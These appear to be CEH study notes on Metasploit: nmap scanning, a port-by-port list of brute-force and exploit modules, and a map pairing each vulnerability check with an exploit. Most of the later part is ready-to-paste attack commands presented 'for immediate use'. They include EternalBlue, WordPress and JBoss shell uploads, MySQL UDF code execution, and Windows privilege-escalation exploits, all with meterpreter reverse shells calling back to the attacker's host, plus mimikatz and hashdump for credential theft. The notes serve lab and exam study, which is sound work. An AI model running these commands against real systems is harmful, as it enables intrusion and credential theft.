### Scan a Target Network using Metasploit

We need to configure metasploit db

```
service postgresql start  
msfconsole  
db_status  
  
msfdb init  
  
service postgresql restart  

db_status
```

Here, we are scanning the whole subnet 10.10.1.0/24 for active hosts.

```
nmap -Pn -sS -A -oX Test 10.10.1.0/24  
  
db_import Test
```

Type **hosts** and hit Enter to view the list of active hosts along with their MAC addresses, OS names, etc.
Type **services** or **db_services** and hit Enter to receive a list of the services running on the active hosts.

# **High-Value Target Ports & Metasploit Modules**

**Author:** Metasploit Helper

**Description:** A curated list of common ports running high-value services, along with reconnaissance, brute-force, and exploit modules for Metasploit. Always use scanners first to identify the exact service and version.

**Disclaimer:** For authorized security testing and educational purposes only.

---

## Port 21 - FTP (File Transfer Protocol)

**Common Service:** FTP Server (e.g., vsftpd, ProFTPD)

*   **Auxiliary #1 (Brute Force):**

    *   `use auxiliary/scanner/ftp/ftp_login`

    *   Purpose: Bruteforces username and password logins.

*   **Exploit #2 (vsftpd Backdoor):**

    *   `use exploit/unix/ftp/vsftpd_234_backdoor`

    *   Purpose: Exploits a backdoor in vsftpd version 2.3.4.
___

## Port 22 - SSH (Secure Shell)

**Common Service:** SSH Server (OpenSSH)

*   **Auxiliary #1 (Brute Force):**

    *   `use auxiliary/scanner/ssh/ssh_login`

    *   Purpose: The primary method for attacking SSH.

*   **Auxiliary #2 (User Enumeration):**

    *   `use auxiliary/scanner/ssh/ssh_enumusers`

    *   Purpose: Enumerates valid system usernames on older OpenSSH versions.
___

## Port 23 - Telnet

**Common Service:** Telnet Server

*   **Auxiliary #1 (Brute Force):**

    *   `use auxiliary/scanner/telnet/telnet_login`

    *   Purpose: Bruteforces logins on the unencrypted service.

*   **Exploit #2 (Encryption Option Exploit):**

    *   `use exploit/linux/telnet/telnet_encrypt_keyid`

    *   Purpose: Exploits a vulnerability in the encryption option handling.
___

## Port 25 / 465 / 587 - SMTP

**Common Service:** Mail Server (Postfix, Sendmail, Exim)

*   **Auxiliary #1 (User Enumeration):**

    *   `use auxiliary/scanner/smtp/smtp_enum`

    *   Purpose: Enumerates valid users via VRFY, EXPN, or RCPT TO.

*   **Exploit #2 (Exim RCE):**

    *   `use exploit/linux/smtp/exim4_deliver_message_priv_esc`

    *   Purpose: Privilege escalation in specific Exim versions.
___

## Port 53 - DNS

**Common Service:** DNS Server (BIND)

*   **Auxiliary #1 (Version Info):**

    *   `use auxiliary/gather/dns_info`

    *   Purpose: Gathers version and information.

*   **Auxiliary #2 (Zone Transfer):**

    *   `use auxiliary/gather/dns_axfr`

    *   Purpose: Attempts a zone transfer to dump all DNS records.
___

## Port 80 / 443 / 8080 - HTTP/HTTPS

**Common Service:** Web Servers (Apache, Nginx, IIS) & Web Apps

*   **Auxiliary #1 (Service Identification):**

    *   `use auxiliary/scanner/http/http_version`

    *   Purpose: The critical first step for all web services.

*   **Exploit #2 (Tomcat Manager):**

    *   `use exploit/multi/http/tomcat_mgr_upload`

    *   Purpose: Uploads a malicious WAR file if manager app credentials are known.
___

## Port 110 / 995 - POP3

**Common Service:** Mail Retrieval Server

*   **Auxiliary #1 (Brute Force):**

    *   `use auxiliary/scanner/pop3/pop3_login`

    *   Purpose: Bruteforces email credentials.

*   **Auxiliary #2 (Version Scan):**

    *   `use auxiliary/scanner/pop3/pop3_version`

    *   Purpose: Discovers POP3 server software and version.
___

## Port 139 / 445 - SMB

**Common Service:** Windows File & Print Sharing

*   **Auxiliary #1 (Reconnaissance):**

    *   `use auxiliary/scanner/smb/smb_version`

    *   `use auxiliary/scanner/smb/smb_enumshares`

    *   Purpose: Discovers OS version and available shares.

*   **Exploit #2 (EternalBlue):**

    *   `use exploit/windows/smb/ms17_010_eternalblue`

    *   Purpose: Exploits a critical vulnerability in SMBv1 (MS17-010).
___

## Port 143 / 993 - IMAP

**Common Service:** Mail Retrieval Server

*   **Auxiliary #1 (Brute Force):**

    *   `use auxiliary/scanner/imap/imap_login`

    *   Purpose: Bruteforces email credentials.

*   **Auxiliary #2 (Version Scan):**

    *   `use auxiliary/scanner/imap/imap_version`

    *   Purpose: Discovers IMAP server software and version.
___

## Port 1433 / 1434 - MSSQL

**Common Service:** Microsoft SQL Server

*   **Auxiliary #1 (Brute Force):**

    *   `use auxiliary/scanner/mssql/mssql_login`

    *   Purpose: Bruteforces the 'sa' and other user accounts.

*   **Exploit #2 (Command Execution):**

    *   `use exploit/windows/mssql/mssql_payload`

    *   Purpose: Executes a payload on the server via `xp_cmdshell`.
___

## Port 1521 - Oracle TNS

**Common Service:** Oracle Database

*   **Auxiliary #1 (SID & Login Brute Force):**

    *   `use auxiliary/scanner/oracle/sid_brute`

    *   `use auxiliary/admin/oracle/oracle_login`

    *   Purpose: Discovers SIDs and then bruteforces logins.

*   **Auxiliary #2 (Authentication Sniffer):**

    *   `use auxiliary/sniffer/oracle`

    *   Purpose: Sniffs and cracks authentication hashes (requires MITM position).
___

## Port 27017 / 27018 - MongoDB

**Common Service:** MongoDB NoSQL Database

*   **Auxiliary #1 (Enumeration):**

    *   `use auxiliary/scanner/mongodb/mongodb_enum`

    *   Purpose: Lists databases if no authentication is enabled.

*   **Auxiliary #2 (Brute Force):**

    *   `use auxiliary/scanner/mongodb/mongodb_login`

    *   Purpose: Bruteforces credentials if authentication is enabled.
___

## Port 3389 - RDP

**Common Service:** Remote Desktop Protocol

*   **Auxiliary #1 (Brute Force):**

    *   `use auxiliary/scanner/rdp/rdp_login`

    *   Purpose: Bruteforces user credentials.

*   **Auxiliary #2 (BlueKeep Scanner):**

    *   `use auxiliary/scanner/rdp/cve_2019_0708_bluekeep`

    *   Purpose: Checks for the critical BlueKeep vulnerability (CVE-2019-0708).
___

## Port 4848 - Oracle GlassFish

**Common Service:** GlassFish Admin Console

*   **Auxiliary #1 (Brute Force):**

    *   `use auxiliary/scanner/http/glassfish_login`

    *   Purpose: Bruteforces the admin console login.

*   **Auxiliary #2 (Traversal - CVE-2017-1000028):**

    *   `use auxiliary/scanner/http/glassfish_traversal`

    *   Purpose: Reads sensitive files like `domain.xml` to steal password hashes.
____

## Port 5432 - PostgreSQL

**Common Service:** PostgreSQL Database

*   **Auxiliary #1 (Brute Force):**

    *   `use auxiliary/scanner/postgres/postgres_login`

    *   Purpose: Bruteforces database credentials.

*   **Exploit #2 (Command Execution):**

    *   `use exploit/linux/postgres/postgres_copy_from_program_cmd_exec`

    *   Purpose: Uses `COPY FROM PROGRAM` to execute commands on the OS.
___

## Port 5985 / 5986 - WinRM

**Common Service:** Windows Remote Management

*   **Auxiliary #1 (Brute Force):**

    *   `use auxiliary/scanner/winrm/winrm_login`

    *   Purpose: Bruteforces credentials for PowerShell remoting.

*   **Exploit #2 (Script Execution):**

    *   `use exploit/windows/winrm/winrm_script_exec`

    *   Purpose: Uploads and executes a payload using valid WinRM credentials.
___

## Port 5984 - Apache CouchDB

**Common Service:** CouchDB NoSQL Database

*   **Auxiliary #1 (Enumeration):**

    *   `use auxiliary/scanner/couchdb/couchdb_enum`

    *   Purpose: Gathers version and database information.

*   **Exploit #2 (RCE - CVE-2017-12635):**

    *   `use exploit/linux/http/apache_couchdb_cmd_exec`

    *   Purpose: Creates an admin user and gains RCE via the Erlang protocol.
___

## Port 6379 - Redis

**Common Service:** Redis In-Memory Data Store

*   **Auxiliary #1 (Information Gathering):**

    *   `use auxiliary/scanner/redis/redis_server`

    *   Purpose: Checks if authentication is required and gathers info.

*   **Exploit #2 (SSH Key Write):**

    *   `use exploit/linux/redis/redis_unauthorized_exec`

    *   Purpose: Writes an SSH key for root access if no authentication is present.
___

## Port 8009 - Apache JServ Protocol (AJP)

**Common Service:** AJP Connector (Tomcat)

*   **Auxiliary/Exploit #1 (Ghostcat - CVE-2020-1938):**

    *   `use auxiliary/admin/http/tomcat_ghostcat`

    *   `use exploit/linux/http/tomcat_ghostcat`

    *   Purpose: Scans for and exploits a file read/inclusion vulnerability.
___

## Port 8282 - HTTP API Management

**Common Service:** Often WSO2, Synapse, or custom APIs

*   **Auxiliary #1 (Service Identification):**

    *   `use auxiliary/scanner/http/http_version`

    *   Purpose: **Critical.** Identifies the specific application running.

*   **Exploit #2 (WSO2 RCE):**

    *   `use exploit/multi/http/wso2_uploader_rce`

    *   Purpose: Exploits file upload functionality in WSO2 products for RCE.
___

## Port 8383 - HTTP Management Consoles

**Common Service:** VMware vCenter, File Services

*   **Auxiliary #1 (Service Identification):**

    *   `use auxiliary/scanner/http/http_version`

    *   Purpose: Identifies the service (e.g., vSphere Client).

*   **Exploit #2 (vCenter RCE - VMSA-2021-0010):**

    *   `use exploit/multi/http/vmware_vcenter_analytics_upload_ova`

    *   Purpose: Exploits an unauthenticated RCE in vCenter (CVE-2021-21972).
___

## Port 9000 / 9001 - Web Applications

**Common Service:** Portainer (Docker), Jenkins, SonarQube

*   **Auxiliary #1 (Service Identification):**

    *   `use auxiliary/scanner/http/http_version`

    *   `use auxiliary/scanner/http/jenkins_enum` (if applicable)

    *   Purpose: **Critical.** The attack path depends entirely on the identified service.

*   **Exploit #2 (Jenkins RCE):**

    *   `use exploit/multi/http/jenkins_script_console`

    *   Purpose: Executes Groovy code in the Jenkins Script Console for a shell.
___

## Port 9200 - Elasticsearch

**Common Service:** Elasticsearch REST API

*   **Auxiliary #1 (Info/Data Disclosure):**

    *   `use auxiliary/scanner/elasticsearch/indices_enum`

    *   Purpose: Enumerates all database indices if authentication is off.

*   **Exploit #2 (RCE - CVE-2014-3120):**

    *   `use exploit/multi/elasticsearch/script_mvel_rce`

    *   Purpose: Executes arbitrary Java code on older versions with scripting enabled.

  ___

## Port 10000 - Webmin

**Common Service:** Webmin System Administration

*   **Auxiliary #1 (Brute Force):**

    *   `use auxiliary/scanner/webmin/webmin_login`

    *   Purpose: Bruteforces the Webmin login.

*   **Exploit #2 (RCE - CVE-2019-15107):**

    *   `use exploit/linux/http/webmin_backdoor`

    *   Purpose: Exploits a backdoor in `password_change.cgi` for unauthenticated RCE.


---

# CEH Metasploit Toolkit #metasploit_tookit  – Detection → Exploitation Map (Refactor)

> One‑to‑one mapping of **checks (detection)** to the **corresponding Metasploit exploit/module** with ready‑to‑paste commands. Keep this open during labs.

---

## A) Network/Remote Vulns

### A.1 MS17‑010 (EternalBlue)

**Detect**

```text
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <ip_or_cidr>
set THREADS 25
run
```

**Exploit**

```text
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <ip>
set RPORT 445
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
set VerifyTarget true
exploit
```

**Post‑ex** (dump creds)

```text
use post/windows/gather/credentials/mimikatz
set SESSION <id>
run
```

---

### A.2 WordPress (Authenticated Upload)

**Detect**

```text
use auxiliary/scanner/http/wordpress_scanner
set RHOSTS <ip>
set RPORT 80
set TARGETURI /
run
```

**Exploit** _(need valid admin creds)_

```text
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS <ip>
set RPORT 80
set TARGETURI /
set USERNAME <wp_admin>
set PASSWORD <wp_pass>
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
exploit
```

---

### A.3 JBoss (Deployment/Console)

**Detect**

```text
use auxiliary/scanner/http/jboss_vulnscan
set RHOSTS <ip>
set RPORT 8080
run
```

**Exploit (pick one per finding)**

```text
# Main Deployer
use exploit/multi/http/jboss_maindeployer
set RHOSTS <ip>
set RPORT 8080
set TARGETURI /
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST <your_ip>
exploit

# DeploymentFileRepository
use exploit/multi/http/jboss_deploymentfilerepository
set RHOSTS <ip>
set RPORT 8080
set TARGETURI /
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST <your_ip>
exploit
```

---

### A.4 MySQL (Weak/Found Creds → Code Exec)

**Detect creds / version**

```text
use auxiliary/scanner/mysql/mysql_version
set RHOSTS <ip>
run
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <ip>
set USER_FILE users.txt  # or: set USERNAME root
set PASS_FILE passwords.txt
set STOP_ON_SUCCESS true
run
```

**Exploit (UDF payload after creds)**

```text
use exploit/multi/mysql/mysql_udf_payload
set RHOST <ip>
set USERNAME <user>
set PASSWORD <pass>
set PAYLOAD windows/meterpreter/reverse_tcp   # or linux/* accordingly
set LHOST <your_ip>
set LPORT 4444
exploit
```

---

## B) Windows Local Privilege Escalation

> Run these **inside** the Windows target (cmd.exe/PowerShell or meterpreter `shell`). Each check maps to a Metasploit local exploit / technique.

### B.1 Service Permission Misconfig (Write/Change → SYSTEM)

**Detect**

```cmd
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
sc qc <service_name>
```

**Exploit**

```text
use exploit/windows/local/service_permissions
set SESSION <id>
set SERVICE <service_name>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
exploit
```

---

### B.2 Unquoted Service Path (Writable Dir in Path)

**Detect**

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\"
```

**Exploit**

```text
use exploit/windows/local/trusted_service_path
set SESSION <id>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
exploit
```

---

### B.3 AlwaysInstallElevated (MSI as SYSTEM)

**Detect**

```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Exploit**

```text
use exploit/windows/local/always_install_elevated
set SESSION <id>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
exploit
```

---

### B.4 Token Privileges (SeImpersonatePrivilege)

**Detect**

```cmd
whoami /priv
```

**Exploit (Meterpreter built‑in / alternatives)**

```text
# Meterpreter: try multiple techniques
getsystem
# Or module leveraging token tricks (varies by target):
use exploit/windows/local/ms16_075_reflection
set SESSION <id>
exploit
```

---

### B.5 Missing Hotfix / Kernel Privesc (Win7)

**Detect**

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe get HotFixID,InstalledOn
```

**Suggest & Exploit**

```text
# Let Metasploit suggest viable locals from the session context
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run

# Example older Win7 locals (choose per suggester output):
use exploit/windows/local/ms10_015_kitrap0d
set SESSION <id>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
exploit
```

---

## C) Handy Post‑Exploitation After SYSTEM

```text
# Hash dump (live)
use post/windows/gather/hashdump
set SESSION <id>
run

# LSA/SAM via builtin privs
use post/windows/gather/credentials/mimikatz
set SESSION <id>
run
```

---

## D) Quick Reference – Scanners vs Exploits (index)

- **MS17‑010** → `auxiliary/scanner/smb/smb_ms17_010` → `exploit/windows/smb/ms17_010_eternalblue`
    
- **WordPress** → `auxiliary/scanner/http/wordpress_scanner` → `exploit/unix/webapp/wp_admin_shell_upload`
    
- **JBoss** → `auxiliary/scanner/http/jboss_vulnscan` → `exploit/multi/http/jboss_maindeployer` / `.../jboss_deploymentfilerepository`
    
- **MySQL** → `auxiliary/scanner/mysql/*` → `exploit/multi/mysql/mysql_udf_payload`
    
- **Service perms** → `accesschk` → `exploit/windows/local/service_permissions`
    
- **Unquoted path** → `wmic ... pathname` → `exploit/windows/local/trusted_service_path`
    
- **AlwaysInstallElevated** → `reg query ...` → `exploit/windows/local/always_install_elevated`
    
- **SeImpersonate** → `whoami /priv` → `meterpreter getsystem` / `exploit/windows/local/ms16_075_reflection`
    
- **Missing hotfix** → `systeminfo`/`wmic qfe` → `post/multi/recon/local_exploit_suggester` → suggested local exploit
    

---

**Done.** This refactor pairs each **check** with its **Metasploit path** and a practical code block for immediate use.